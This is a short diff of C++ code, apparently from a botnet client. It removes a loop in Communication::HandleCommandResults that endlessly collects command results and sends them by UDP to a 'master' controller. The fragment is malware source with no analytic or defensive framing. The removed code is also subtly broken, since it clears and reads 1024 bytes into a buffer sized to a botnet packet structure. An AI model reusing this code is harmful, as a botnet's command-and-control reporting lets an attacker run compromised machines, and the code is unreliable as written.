@@ -202,12 +202,4 @@ void Communication::HandleCommandResults()
 	if (IPC_init() != 0)
 		return;
 	
-	u_char command_res[sizeof(struct botnet_pack)];
-	
-	while (1)
-	{
-		memset(command_res, 0, 1024);
-		get_result(command_res, 1024);
-		sendto(udp_sock, (char*)command_res, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&master, sizeof(master));
-	}
 }
